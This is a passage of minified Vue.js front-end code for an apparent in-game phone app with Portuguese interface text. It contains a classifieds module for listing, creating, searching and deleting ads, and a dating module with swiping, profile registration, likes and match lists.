    }, null, 8, ["src"]), Pl("div", JA, [Pl("h1", XA, g(n.data.title), 1), Pl("div", YA, [Pl("strong", ZA, g(e.$filters.intToMoney(n.data.price)), 1), Pl("div", QA, [l.moderator ? (wl(), _l("button", {
        key: 0,
        class: "mr-8 text-red-500",
        onClick: t[1] || (t[1] = (...e) => l.destroy && l.destroy(...e))
    }, [eS])) : Ml("", !0), Pl("button", {
        onClick: t[2] || (t[2] = t => e.$router.push("/olx/" + n.data.id)),
        class: "bg-olx px-6 py-2 text-white rounded-xl"
    }, " Ver mais ")])])])])) : Ml("", !0)
};
const tS = {},
    nS = {
        class: "absolute bottom-0 left-0 right-0 h-32 bg-theme-accent border-t-2 border-theme text-theme grid grid-cols-4 p-3 px-10"
    },
    lS = Pl("i", {
        class: "fal fa-home-alt text-4xl block"
    }, null, -1),
    aS = Pl("span", {
        class: "text-base font-bold"
    }, "Início", -1),
    sS = Pl("i", {
        class: "fal fa-bullhorn text-4xl block"
    }, null, -1),
    oS = Pl("span", {
        class: "text-base font-bold"
    }, "Anunciar", -1),
    rS = Pl("i", {
        class: "fal fa-search text-4xl block"
    }, null, -1),
    iS = Pl("span", {
        class: "text-base font-bold"
    }, "Buscar", -1),
    cS = Pl("i", {
        class: "fal fa-box text-4xl block"
    }, null, -1),
    uS = Pl("span", {
        class: "text-base font-bold"
    }, "Seus anúncios", -1);
tS.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", nS, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.replace("/olx")),
        class: {
            "text-olx": "/olx" == e.$route.path
        }
    }, [lS, aS], 2), Pl("button", {
        onClick: t[2] || (t[2] = t => e.$router.push("/olx/create")),
        class: {
            "text-olx": "/olx/create" == e.$route.path
        }
    }, [sS, oS], 2), Pl("button", {
        onClick: t[3] || (t[3] = t => e.$router.push("/olx/search")),
        class: {
            "text-olx": "/olx/search" == e.$route.path
        }
    }, [rS, iS], 2), Pl("button", {
        onClick: t[4] || (t[4] = t => e.$router.push("/olx/dashboard")),
        class: {
            "text-olx": "/olx/dashboard" == e.$route.path
        }
    }, [cS, uS], 2)])
};
const dS = {
        components: {
            Header: BA,
            Ad: WA,
            Footer: tS
        },
        setup() {
            jl("setDark")(!0);
            const e = rt([]);
            return _o.backend.olx_search("%", "%").then((t => {
                e.value = t
            })), {
                ads: e
            }
        }
    },
    pS = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    fS = {
        class: "overflow-y-auto hide-scroll"
    },
    mS = Pl("div", {
        class: "mt-32"
    }, null, -1);
dS.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("Ad"),
        i = dl("Footer");
    return wl(), _l("div", pS, [Pl(o, {
        title: "Anúncios",
        class: "flex-shrink-0"
    }), Pl("ul", fS, [(wl(!0), _l(bl, null, fa(l.ads, (e => (wl(), _l("li", {
        key: e.id
    }, [Pl(r, {
        data: e
    }, null, 8, ["data"])])))), 128))]), mS, Pl(i)])
};
const hS = rt(""),
    bS = rt(""),
    gS = rt(),
    vS = rt(""),
    xS = rt([]),
    yS = {
        components: {
            Header: BA,
            Footer: tS
        },
        setup() {
            jl("setDark")(!0), io();
            const e = Qi(),
                t = jl("alert");
            return {
                title: hS,
                category: bS,
                description: vS,
                price: gS,
                images: xS,
                addImage: async function() {
                    try {
                        const e = await _o.useAnyImage("/olx");
                        xS.value.push(e)
                    } catch (e) {}
                },
                submit: function() {
                    var n;
                    const l = {
                        title: hS,
                        category: bS,
                        price: gS,
                        description: vS,
                        images: xS
                    };
                    for (let e in l) l[e] = l[e].value;
                    return l.title.trim() ? l.category ? l.price ? l.images.length ? (l.price = parseInt(null == (n = l.price) ? void 0 : n.replace(/\D/g, "")), void _o.backend.olx_createAd(l).then((n => {
                        if (n.error) return t(n.error);
                        e.replace("/olx"), hS.value = "", bS.value = "", gS.value = void 0, vS.value = "", xS.value = []
                    }))) : t("Ao menos uma imagem é obrigatória.") : t("Insira um preço") : t("Escolha uma categoria") : t("Título inválido")
                }
            }
        }
    },
    kS = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    wS = {
        class: "p-5"
    },
    CS = Pl("label", null, "Título do Anúncio", -1),
    _S = {
        class: "mt-5"
    },
    AS = Pl("label", null, "Categoria", -1),
    SS = {
        class: "mt-5"
    },
    RS = Pl("label", null, "Preço", -1),
    TS = {
        class: "mt-5 relative"
    },
    ES = Pl("label", null, "Descrição", -1),
    PS = {
        class: "absolute bottom-4 right-4 text-lg text-theme"
    },
    LS = Pl("label", null, "Fotos", -1),
    IS = {
        class: "h-24 flex"
    },
    OS = Pl("i", {
        class: "fas fa-plus"
    }, null, -1);
yS.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-input"),
        i = dl("app-select");
    return wl(), _l("div", kS, [Pl(o, {
        title: "Anunciar"
    }), Pl("div", wS, [Pl("div", null, [CS, Pl(r, {
        darkable: "true",
        modelValue: l.title,
        "onUpdate:modelValue": t[1] || (t[1] = e => l.title = e),
        placeholder: "BMW i8",
        maxlength: "64",
        class: "text-2xl"
    }, null, 8, ["modelValue"])]), Pl("div", _S, [AS, Pl(i, {
        darkable: "true",
        class: "text-2xl",
        modelValue: l.category,
        "onUpdate:modelValue": t[2] || (t[2] = e => l.category = e),
        options: {
            cars: "Carros",
            motorcycles: "Motos",
            houses: "Casas",
            misc: "Outros"
        }
    }, null, 8, ["modelValue"])]), Pl("div", SS, [RS, Pl(r, {
        darkable: "true",
        modelValue: l.price,
        "onUpdate:modelValue": t[3] || (t[3] = e => l.price = e),
        format: "money",
        maxlength: "11",
        class: "text-2xl"
    }, null, 8, ["modelValue"])]), Pl("div", TS, [ES, Zn(Pl("textarea", {
        onKeydown: t[4] || (t[4] = us(is((() => {}), ["prevent"]), ["enter"])),
        class: "resize-none p-3 bg-theme border border-theme rounded-lg fancy-scroll w-full text-3xl",
        "onUpdate:modelValue": t[5] || (t[5] = e => l.description = e),
        maxlength: "1024",
        rows: "8"
    }, null, 544), [
        [ns, l.description]
    ]), Pl("span", PS, g(l.description.length) + "/1024", 1)]), Pl("div", null, [LS, Pl("div", IS, [(wl(!0), _l(bl, null, fa(l.images, ((e, t) => (wl(), _l("img", {
        key: t,
        src: e,
        class: "w-24 h-24 border-2 mr-2"
    }, null, 8, ["src"])))), 128)), l.images.length < 3 ? (wl(), _l("button", {
        key: 0,
        onClick: t[6] || (t[6] = (...e) => l.addImage && l.addImage(...e)),
        class: "w-24 h-24 border-2 border-olx flex flex-center text-olx"
    }, [OS])) : Ml("", !0)])]), Pl("button", {
        onClick: t[7] || (t[7] = (...e) => l.submit && l.submit(...e)),
        class: "absolute bottom-16 right-8 bg-olx p-3 px-6 text-white rounded-xl mt-2 block ml-auto"
    }, "Publicar")])])
};
const MS = {
        components: {
            Header: BA,
            Ad: WA
        },
        setup() {
            jl("setDark")(!0);
            const e = rt(""),
                t = rt("%"),
                n = rt([]);
            let l;

            function a() {
                let l = e.value || "%";
                "%" != l && (l = "%" + l + "%"), _o.backend.olx_search(l, t.value).then((e => n.value = e))
            }
            return Rn(e, (() => {
                clearTimeout(l), l = setTimeout(a, 500)
            })), Rn(t, (() => a())), a(), {
                query: e,
                category: t,
                ads: n
            }
        }
    },
    VS = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    DS = {
        class: "p-3 flex"
    },
    US = {
        class: "overflow-y-auto hide-scroll"
    },
    NS = Pl("div", {
        class: "mt-32"
    }, null, -1);
MS.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-input"),
        i = dl("app-select"),
        c = dl("Ad");
    return wl(), _l("div", VS, [Pl(o, {
        title: "Busca"
    }), Pl("div", DS, [Pl(r, {
        darkable: "true",
        modelValue: l.query,
        "onUpdate:modelValue": t[1] || (t[1] = e => l.query = e),
        placeholder: "Título do anúncio",
        class: "text-2xl rounded-r-none"
    }, null, 8, ["modelValue"]), Pl(i, {
        darkable: "true",
        modelValue: l.category,
        "onUpdate:modelValue": t[2] || (t[2] = e => l.category = e),
        class: "rounded-l-none border-l-0 text-2xl",
        options: {
            "%": "Todos",
            cars: "Carros",
            motorcycles: "Motos",
            houses: "Casas",
            misc: "Outros"
        }
    }, null, 8, ["modelValue"])]), Pl("ul", US, [(wl(!0), _l(bl, null, fa(l.ads, (e => (wl(), _l("li", {
        key: e.id
    }, [Pl(c, {
        data: e
    }, null, 8, ["data"])])))), 128))]), NS])
};
const $S = {
        components: {
            Header: BA,
            Ad: WA,
            Footer: tS
        },
        inject: ["setDark"],
        setup() {
            const e = ec(),
                t = rt(),
                n = rt(0),
                l = _o.identity;
            return _o.backend.olx_fetch(e.params.id).then((e => {
                if (t.value = e || !1, e)
                    for (let t of e.images) {
                        (new Image).src = t
                    }
            })), {
                ad: t,
                yourself: l,
                imgIndex: n
            }
        },
        mounted() {
            this.setDark(!0)
        }
    },
    jS = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    FS = {
        key: 0
    },
    zS = {
        class: "relative bg-black"
    },
    BS = Pl("i", {
        class: "fal fa-chevron-left fa-2x"
    }, null, -1),
    HS = Pl("i", {
        class: "fal fa-chevron-right fa-2x"
    }, null, -1),
    qS = {
        class: "p-3 overflow-y-auto-hide-scroll"
    },
    GS = {
        class: "py-3"
    },
    WS = {
        class: "font-bold text-5xl"
    },
    KS = {
        class: "opacity-75 my-8 text-4xl break-words"
    },
    JS = {
        class: "opacity-50 text-2xl"
    },
    XS = Pl("hr", {
        class: "border-theme"
    }, null, -1),
    YS = {
        class: "py-3"
    },
    ZS = Pl("h1", {
        class: "font-semibold mb-4 text-4xl"
    }, "Descrição", -1),
    QS = {
        class: "text-2xl opacity-75 break-words"
    },
    eR = Pl("hr", {
        class: "border-theme"
    }, null, -1),
    tR = {
        class: "py-3"
    },
    nR = Pl("h1", {
        class: "font-semibold mb-4 text-4xl"
    }, "Anunciante", -1),
    lR = {
        class: "text-2xl"
    },
    aR = Pl("strong", {
        class: "opacity-75"
    }, "Nome: ", -1),
    sR = {
        class: "opacity-50"
    },
    oR = Pl("strong", {
        class: "opacity-75"
    }, "Passaporte: ", -1),
    rR = {
        class: "opacity-50"
    },
    iR = Pl("strong", {
        class: "opacity-75"
    }, "Telefone: ", -1),
    cR = {
        class: "select-text opacity-50"
    },
    uR = Pl("i", {
        class: "fab fa-whatsapp"
    }, null, -1),
    dR = {
        key: 1
    },
    pR = Pl("h1", {
        class: "p-3 text-center opacity-75 font-semibold"
    }, "Anúncio não encontrado", -1);
$S.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", jS, [Pl(o, {
        title: "Detalhes"
    }), l.ad ? (wl(), _l("div", FS, [Pl("div", zS, [0 != l.imgIndex ? (wl(), _l("button", {
        key: 0,
        onClick: t[1] || (t[1] = e => l.imgIndex = Math.max(0, l.imgIndex - 1)),
        class: "absolute text-white h-full w-2/12"
    }, [BS])) : Ml("", !0), Pl("img", {
        class: "mx-auto",
        style: {
            "max-height": "21.5rem"
        },
        src: l.ad.images[l.imgIndex],
        alt: ""
    }, null, 8, ["src"]), l.imgIndex < l.ad.images.length - 1 ? (wl(), _l("button", {
        key: 1,
        onClick: t[2] || (t[2] = e => l.imgIndex = Math.min(l.ad.images.length - 1, l.imgIndex + 1)),
        class: "absolute top-0 right-0 text-white h-full w-2/12"
    }, [HS])) : Ml("", !0)]), Pl("div", qS, [Pl("div", GS, [Pl("h1", WS, g(e.$filters.intToMoney(l.ad.price)), 1), Pl("h3", KS, g(l.ad.title), 1), Pl("span", JS, "Publicado em " + g(e.$filters.unixToDate(l.ad.created_at)), 1)]), XS, Pl("div", YS, [ZS, Pl("span", QS, g(l.ad.description), 1)]), eR, Pl("div", tR, [nR, Pl("ul", lR, [Pl("li", null, [aR, Pl("span", sR, g(l.ad.author.name), 1)]), Pl("li", null, [oR, Pl("span", rR, g(l.ad.author.user_id), 1)]), Pl("li", null, [iR, Pl("span", cR, g(l.ad.author.phone), 1), l.yourself.phone != l.ad.author.phone ? (wl(), _l("button", {
        key: 0,
        class: "ml-3 text-green-500",
        onClick: t[3] || (t[3] = t => e.$router.push("/whatsapp/" + l.ad.author.phone))
    }, [uR])) : Ml("", !0)])])])])])) : !1 === l.ad ? (wl(), _l("div", dR, [pR])) : Ml("", !0)])
};
const fR = {
        components: {
            Header: BA,
            Ad: WA
        },
        setup() {
            jl("setDark")(!0);
            const e = jl("alert"),
                t = rt();
            return _o.backend.olx_dashboard().then((e => {
                t.value = e
            })), {
                ads: t,
                destroy: function(n) {
                    _o.backend.olx_destroy(n).then((l => {
                        (null == l ? void 0 : l.error) ? e(l.error): t.value = t.value.filter((e => e.id != n))
                    }))
                }
            }
        }
    },
    mR = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    hR = {
        key: 0,
        class: "overflow-y-auto hide-scroll"
    },
    bR = {
        class: "ml-3 flex flex-col flex-1 justify-between"
    },
    gR = {
        class: "text-2xl text-theme opacity-75 break-words"
    },
    vR = {
        class: "text-xl text-theme opacity-75"
    },
    xR = Pl("i", {
        class: "fal fa-trash-alt text-red-500"
    }, null, -1),
    yR = {
        key: 1,
        class: "p-3"
    },
    kR = Pl("h1", {
        class: "text-theme font-semibold text-center"
    }, "Você não possui anúncios", -1),
    wR = Pl("div", {
        class: "mt-32"
    }, null, -1);
fR.render = function(e, t, n, l, a, s) {
    var o;
    const r = dl("Header");
    return wl(), _l("div", mR, [Pl(r, {
        title: "Seus anúncios"
    }), (null == (o = l.ads) ? void 0 : o.length) ? (wl(), _l("div", hR, [Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.ads, (t => (wl(), _l("li", {
        key: t.id,
        class: "border-b border-theme last:border-b-0 flex"
    }, [Pl("img", {
        src: t.images[0],
        class: "h-32"
    }, null, 8, ["src"]), Pl("div", bR, [Pl("h1", gR, g(t.title), 1), Pl("h3", vR, g(e.$filters.intToMoney(t.price)), 1)]), Pl("button", {
        class: "m-3 p-2",
        onClick: e => l.destroy(t.id)
    }, [xR], 8, ["onClick"])])))), 128))])])) : l.ads ? (wl(), _l("div", yR, [kR])) : Ml("", !0), wR])
};
const CR = {},
    _R = {
        class: "mt-24 mx-4 bg-lightgray px-8 py-6 rounded-lg flex justify-between"
    };
CR.render = function(e, t) {
    return wl(), _l("div", _R, [Pl("button", null, [Pl("img", {
        src: e.$asset("/stock/tinder/flame.png"),
        class: "w-10",
        style: {
            filter: "/tinder" != e.$route.path ? "opacity(0.6) invert(0.5)" : "none"
        },
        onClick: t[1] || (t[1] = t => e.$router.replace("/tinder"))
    }, null, 12, ["src"])]), Pl("button", null, [Pl("img", {
        src: e.$asset("/stock/tinder/heart.png"),
        class: "w-10",
        style: {
            filter: "/tinder/likes" != e.$route.path ? "opacity(0.6) invert(0.5)" : "none"
        },
        onClick: t[2] || (t[2] = t => e.$router.replace("/tinder/likes"))
    }, null, 12, ["src"])]), Pl("button", null, [Pl("img", {
        src: e.$asset("/stock/tinder/chat.png"),
        class: "w-10",
        style: {
            filter: "/tinder/chats" != e.$route.path ? "opacity(0.6) invert(0.5)" : "none"
        },
        onClick: t[3] || (t[3] = t => e.$router.replace("/tinder/chats"))
    }, null, 12, ["src"])]), Pl("button", null, [Pl("img", {
        src: e.$asset("/stock/tinder/user.png"),
        class: "w-10",
        style: {
            filter: "/tinder/profile" != e.$route.path ? "opacity(0.6) invert(0.5)" : "none"
        },
        onClick: t[4] || (t[4] = t => e.$router.replace("/tinder/profile"))
    }, null, 12, ["src"])])])
};
const AR = {
        components: {
            Header: CR
        },
        setup() {
            jl("setDark")(!1);
            const e = Qi(),
                t = rt();
            return _o.backend.tinder().then((async n => {
                n ? t.value = await _o.backend.tinder_next(0) : "/tinder" == e.currentRoute.value.path && e.replace("/tinder/register")
            })), {
                peer: t,
                back: function() {
                    t.value && _o.backend.tinder_next(t.value.id, !1).then((e => {
                        e ? t.value = e : t.value.previous = !1
                    }))
                },
                next: function(e) {
                    t.value && _o.backend.tinder_next(t.value.id, !0, e).then((e => t.value = e))
                }
            }
        }
    },
    SR = {
        class: "h-full bg-white flex flex-col"
    },
    RR = {
        key: 0,
        class: "flex-1 mt-8 mx-4"
    },
    TR = {
        class: "relative mt-4"
    },
    ER = {
        class: "absolute bottom-4 left-4 right-4 text-white text-4xl"
    },
    PR = {
        class: "flex"
    },
    LR = {
        class: "font-bold"
    },
    IR = {
        class: "ml-3"
    },
    OR = {
        class: "flex items-center"
    },
    MR = {
        class: "text-lg ml-2"
    },
    VR = {
        key: 0,
        class: "grid grid-cols-3 gap-4"
    },
    DR = {
        class: "flex-1 overflow-y-auto text-3xl h-80 fancy-scroll mt-4 whitespace-pre-wrap"
    },
    UR = {
        class: "absolute bottom-8 inset-x-4 px-8 h-28 bg-lightgray flex justify-between rounded-2xl"
    },
    NR = {
        key: 1
    },
    $R = Pl("p", {
        class: "text-gray-500 text-center text-xl mt-4"
    }, "Não encontramos ninguém compatível com você.", -1);
AR.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", SR, [Pl(o), l.peer && "object" == typeof l.peer ? (wl(), _l("div", RR, [Pl("div", TR, [Pl("img", {
        src: l.peer.image,
        class: "rounded-2xl w-full max-h-96 mx-auto"
    }, null, 8, ["src"]), Pl("div", ER, [Pl("div", PR, [Pl("h1", LR, g(l.peer.name), 1), Pl("h3", IR, g(l.peer.age), 1)]), Pl("div", OR, [Pl("div", {
        class: ["w-2 h-2 rounded-full", [l.peer.online ? "bg-green-400" : "bg-gray-400"]]
    }, null, 2), Pl("span", MR, g(l.peer.online ? "Online" : "Offline"), 1)]), l.peer.show_tags ? (wl(), _l("ul", VR, [(wl(!0), _l(bl, null, fa(l.peer.tags, ((e, t) => (wl(), _l("li", {
        key: t,
        class: "text-xl tinder-chip"
    }, g(e), 1)))), 128))])) : Ml("", !0)])]), Pl("p", DR, g(l.peer.bio), 1), Pl("div", UR, [l.peer.previous ? (wl(), _l("button", {
        key: 0,
        onClick: t[1] || (t[1] = e => l.back())
    }, [Pl("img", {
        src: e.$asset("/stock/tinder/redo.png"),
        class: "h-16"
    }, null, 8, ["src"])])) : Ml("", !0), Pl("button", {
        onClick: t[2] || (t[2] = e => l.next(0))
    }, [Pl("img", {
        src: e.$asset("/stock/tinder/refuse.png"),
        class: "h-16"
    }, null, 8, ["src"])]), Pl("button", {
        onClick: t[3] || (t[3] = e => l.next(2))
    }, [Pl("img", {
        src: e.$asset("/stock/tinder/star.png"),
        class: "h-16"
    }, null, 8, ["src"])]), Pl("button", {
        onClick: t[4] || (t[4] = e => l.next(1))
    }, [Pl("img", {
        src: e.$asset("/stock/tinder/like.png"),
        class: "h-16"
    }, null, 8, ["src"])])])])) : (wl(), _l("div", NR, [Pl("img", {
        src: e.$asset("/stock/tinder/heartbreak.svg"),
        class: "mx-auto mt-56 px-24"
    }, null, 8, ["src"]), $R]))])
};
const jR = Ze({
        show_gender: !0,
        show_tags: !0
    }),
    FR = {
        components: {},
        setup() {
            const e = jl("setDark"),
                t = Qi();
            e(!0);
            const n = Ze({
                    tags: new Set
                }),
                l = rt();
            return {
                payload: jR,
                tmp: n,
                error: l,
                takeSelfie: async function() {
                    try {
                        const t = await _o.useAnyImage("/tinder", !0);
                        jR.image = t, e(!1)
                    } catch (t) {}
                },
                next: function() {
                    var e;
                    if (jR.name)
                        if (jR.age)
                            if (jR.gender)
                                if (jR.tags)
                                    if (jR.target) {
                                        if (!jR.bio) {
                                            const e = n.bio;
                                            if (!e) return l.value = "Preencha a bio";
                                            if (e.length > 1024) return l.value = "Limite de caracteres ultrapassado";
                                            jR.bio = e, _o.backend.tinder_register(jR).then((() => {
                                                t.replace("/tinder")
                                            }))
                                        }
                                    } else {
                                        const e = n.target;
                                        if (!e) return l.value = "Escolha sua preferência";
                                        jR.target = e
                                    }
                    else {
                        const e = [...n.tags];
                        if (!e.length) return l.value = "Escolha pelo menos uma orientação";
                        if (e.length > 3) return l.value = "Escolha no máximo 3";
                        jR.tags = e
                    } else {
                        const e = n.gender;
                        if (!e) return l.value = "Escolhe um gênero";
                        jR.gender = e
                    } else {
                        const e = parseInt(n.age);
                        if (!e) return l.value = "Insira sua idade";
                        if (e < 18) return l.value = "A idade mínima é 18";
                        jR.age = e
                    } else {
                        const t = null == (e = n.name) ? void 0 : e.trim();
                        if (!t) return l.value = "Insira seu nome e sobrenome";
                        if (!t.includes(" ")) return l.value = "Insira seu sobrenome";
                        if (t.match(/[\d!@#$%&*()\-=_+/]/)) return l.value = "Seu nome não pode ter números/símbolos";
                        jR.name = t
                    }
                    l.value = null
                }
            }
        },
        unmounted() {
            for (let e in jR) e.startsWith("show_") || delete jR[e]
        }
    },
    zR = sn("data-v-6295e269");
ln("data-v-6295e269");
const BR = {
        class: "flex flex-col h-full"
    },
    HR = {
        key: 0,
        container: "",
        class: "flex-1"
    },
    qR = Pl("span", {
        class: "text-xl text-white block text-center mt-4"
    }, "Clique na imagem para alterar", -1),
    GR = {
        key: 1,
        class: "flex-1 bg-white"
    },
    WR = {
        key: 0,
        class: "mt-96 px-20"
    },
    KR = Pl("p", {
        class: "text-xl text-gray-400 mt-2"
    }, "É assim que o seu nome vai aparecer no Tinder e você não poderá alterá-lo depois.", -1),
    JR = {
        key: 1,
        class: "mt-96 px-20"
    },
    XR = Pl("p", {
        class: "text-xl text-gray-400 mt-2"
    }, "Sua idade será pública.", -1),
    YR = {
        key: 2,
        class: "mt-80 px-20"
    },
    ZR = Pl("span", {
        class: "text-2xl tinder-gray"
    }, "Selecione o seu gênero.", -1),
    QR = {
        class: "flex items-center"
    },
    eT = Pl("label", {
        class: "ml-2 text-2xl tinder-gray"
    }, "Mostrar meu gênero no perfil", -1),
    tT = {
        key: 3,
        class: "mt-60 px-20"
    },
    nT = Pl("span", {
        class: "text-2xl tinder-gray"
    }, "Selecione até 3", -1),
    lT = {
        class: "flex items-center"
    },
    aT = Pl("label", {
        class: "ml-2 text-2xl tinder-gray"
    }, "Mostrar minha orientação no meu perfil", -1),
    sT = {
        key: 4,
        class: "mt-72 px-20"
    },
    oT = Pl("span", {
        class: "text-2xl tinder-gray"
    }, "Sua preferência é por", -1),
    rT = {
        key: 5,
        class: "mt-72 px-20"
    },
    iT = Pl("span", {
        class: "text-xl tinder-gray"
    }, "Escreva a sua biografia", -1),
    cT = Pl("p", {
        class: "text-xl tinder-gray"
    }, "É assim que a sua biografia vai aparecer no Tinder, mas você poderá alterá-la depois.", -1),
    uT = {
        key: 6,
        class: "mt-96 text-center"
    },
    dT = {
        key: 7,
        class: "absolute bottom-32 w-full text-center text-2xl text-red-500"
    },
    pT = {
        key: 8,
        class: "absolute bottom-20 inset-x-0 text-center"
    };
an();
const fT = zR(((e, t, n, l, a, s) => {
    const o = dl("app-loading");
    return wl(), _l("div", BR, [l.payload.image ? (wl(), _l("div", GR, [Pl("img", {
        class: "mx-auto mt-20 h-16",
        src: e.$asset("/stock/tinder/logo.svg"),
        style: {
            filter: "invert(0.4)"
        }
    }, null, 8, ["src"]), l.payload.name ? l.payload.age ? l.payload.gender ? l.payload.tags ? l.payload.target ? l.payload.bio ? (wl(), _l("div", uT, [Pl(o, {
        style: {
            filter: "invert(0.5)"
        }
    })])) : (wl(), _l("div", rT, [iT, Zn(Pl("textarea", {
        "onUpdate:modelValue": t[10] || (t[10] = e => l.tmp.bio = e),
        onKeydown: t[11] || (t[11] = us(is((() => {}), ["prevent"]), ["enter"])),
        class: "border h-80 fancy-scroll rounded-xl text-xl w-full resize-none p-4",
        spellcheck: "false"
    }, null, 544), [
        [ns, l.tmp.bio]
    ]), cT])) : (wl(), _l("div", sT, [oT, (wl(), _l(bl, null, fa({
        Male: "Homens",
        Female: "Mulheres",
        All: "Todos"
    }, ((e, t) => Pl("button", {
        key: t,
        onClick: e => l.tmp.target = t,
        class: ["w-full border border-gray-200 rounded-xl py-3 mb-3", {
            "border-gray-500": l.tmp.target == t
        }]
    }, g(e), 11, ["onClick"]))), 64))])) : (wl(), _l("div", tT, [nT, (wl(), _l(bl, null, fa(["Heterossexual", "Gay", "Lésbica", "Bissexual", "Assexual", "Demissexual", "Pansexual", "Outros"], (e => Pl("button", {
        key: e,
        class: ["block mb-3 text-5xl text-gray-400 transition-color duration-300", {
            "text-gray-900": l.tmp.tags.has(e)
        }],
        onClick: t => l.tmp.tags.has(e) ? l.tmp.tags.delete(e) : l.tmp.tags.add(e)
    }, g(e), 11, ["onClick"]))), 64)), Pl("div", lT, [Zn(Pl("input", {
        "onUpdate:modelValue": t[9] || (t[9] = e => l.payload.show_tags = e),
        type: "checkbox",
        style: {
            filter: "grayscale(1)"
        }
    }, null, 512), [
        [ls, l.payload.show_tags]
    ]), aT])])) : (wl(), _l("div", YR, [ZR, Pl("button", {
        onClick: t[6] || (t[6] = e => l.tmp.gender = "Male"),
        class: ["w-full border border-gray-200 rounded-xl py-3 mb-3", {
            "border-gray-500": "Male" == l.tmp.gender
        }]
    }, " Homem ", 2), Pl("button", {
        onClick: t[7] || (t[7] = e => l.tmp.gender = "Female"),
        class: ["w-full border border-gray-200 rounded-xl py-3 mb-3", {
            "border-gray-500": "Female" == l.tmp.gender
        }]
    }, " Mulher ", 2), Pl("div", QR, [Zn(Pl("input", {
        "onUpdate:modelValue": t[8] || (t[8] = e => l.payload.show_gender = e),
        type: "checkbox",
        style: {
            filter: "grayscale(1)"
        }
    }, null, 512), [
        [ls, l.payload.show_gender]
    ]), eT])])) : (wl(), _l("div", JR, [Zn(Pl("input", {
        autofocus: "",
        onKeydown: t[4] || (t[4] = us(((...e) => l.next && l.next(...e)), ["enter"])),
        "onUpdate:modelValue": t[5] || (t[5] = e => l.tmp.age = e),
        type: "text",
        maxlength: "3",
        min: "18",
        placeholder: "21",
        class: "mx-auto block w-full border-b text-gray-800"
    }, null, 544), [
        [ns, l.tmp.age]
    ]), XR])) : (wl(), _l("div", WR, [Zn(Pl("input", {
        autofocus: "",
        onKeydown: t[2] || (t[2] = us(((...e) => l.next && l.next(...e)), ["enter"])),
        "onUpdate:modelValue": t[3] || (t[3] = e => l.tmp.name = e),
        type: "text",
        maxlength: "255",
        placeholder: "Nome e Sobrenome",
        class: "mx-auto block w-full border-b text-gray-800"
    }, null, 544), [
        [ns, l.tmp.name]
    ]), KR])), l.error ? (wl(), _l("p", dT, g(l.error), 1)) : Ml("", !0), l.payload.bio ? Ml("", !0) : (wl(), _l("div", pT, [Pl("button", {
        onClick: t[12] || (t[12] = (...e) => l.next && l.next(...e)),
        class: "tinder-gray font-semibold text-4xl"
    }, " CONTINUAR ")]))])) : (wl(), _l("div", HR, [Pl("img", {
        src: e.$asset("/stock/tinder/logo.svg"),
        class: "mx-auto mt-32 w-5/12"
    }, null, 8, ["src"]), Pl("div", {
        onClick: t[1] || (t[1] = (...e) => l.takeSelfie && l.takeSelfie(...e)),
        class: "w-80 h-80 bg-white mx-auto mt-56 rounded-30 flex flex-center"
    }, [Pl("img", {
        class: "w-1/2",
        style: {
            filter: "grayscale(1) opacity(0.5)"
        },
        src: e.$asset("/stock/tinder/flame.png")
    }, null, 8, ["src"])]), qR]))])
}));
FR.render = fT, FR.__scopeId = "data-v-6295e269";
const mT = {
        components: {
            Header: CR
        },
        setup() {
            jl("setDark")(!1);
            const e = rt();
            return _o.backend.tinder_liked().then((t => {
                e.value = t
            })), {
                likes: e
            }
        }
    },
    hT = sn("data-v-2d4e420b");
ln("data-v-2d4e420b");
const bT = {
        class: "h-full bg-white flex flex-col"
    },
    gT = {
        key: 0,
        class: "w-2/3 mx-auto mt-80"
    },
    vT = Pl("p", {
        class: "text-gray-500 text-xl mt-2"
    }, "Ainda ninguém te curtiu, mas eu curto você.", -1),
    xT = {
        key: 1,
        class: "overflow-y-auto hide-scroll my-3 mx-6 grid grid-cols-2 gap-6"
    },
    yT = {
        class: "absolute bottom-1 left-1 text-xl text-white"
    };
an();
const kT = hT(((e, t, n, l, a, s) => {
    const o = dl("Header");
    return wl(), _l("div", bT, [Pl(o), l.likes && !l.likes.length ? (wl(), _l("div", gT, [Pl("img", {
        src: e.$asset("/stock/tinder/dislike.svg"),
        class: "w-2/3 mx-auto"
    }, null, 8, ["src"]), vT])) : (wl(), _l("div", xT, [(wl(!0), _l(bl, null, fa(l.likes, (e => (wl(), _l("div", {
        class: "relative",
        key: e.id
    }, [Pl("img", {
        src: e.image,
        class: "rounded-lg"
    }, null, 8, ["src"]), Pl("p", yT, [Pl("b", null, g(e.name), 1), Pl("span", null, ", " + g(e.age), 1)])])))), 128))]))])
}));
mT.render = kT, mT.__scopeId = "data-v-2d4e420b";
const wT = {
        components: {
            Header: CR
        },
        setup() {
            jl("setDark")(!1);
            const e = rt([]),
                t = da((() => e.value.filter((e => e.last_message)).sort(((e, t) => t.last_message.created_at - e.last_message.created_at)))),
                n = da((() => e.value.filter((e => !e.last_message))));
            return _o.backend.tinder_matches().then((t => {
                e.value = null != t ? t : []
            })), _o.onceRoute("TINDER_MESSAGE", (n => {
                const l = e.value.find((e => e.id == n.sender));
                l && (l.last_message = n, t.effect())
            })), {
                fresh: n,
                conversations: t
            }
        }
    },
    CT = {
        class: "h-full bg-white flex flex-col"
    },
    _T = {
        key: 0,
        class: "m-4"
    },
    AT = Pl("span", {
        class: "text-tinder text-2xl"
    }, "Novos Matches", -1),
    ST = {
        class: "bg-lightgray h-36 p-4 rounded-2xl flex overflow-x-auto tinder-scroll"
    },
    RT = {
        class: "overflow-hidden whitespace-nowrap text-base w-20"
    },
    TT = {
        key: 1,
        class: "text-tinder text-2xl m-4"
    },
    ET = {
        key: 2,
        class: "flex-1 overflow-y-auto hide-scroll m-4"
    },
    PT = {
        class: "ml-5 flex-1"
    },
    LT = {
        class: "text-2xl font-bold"
    },
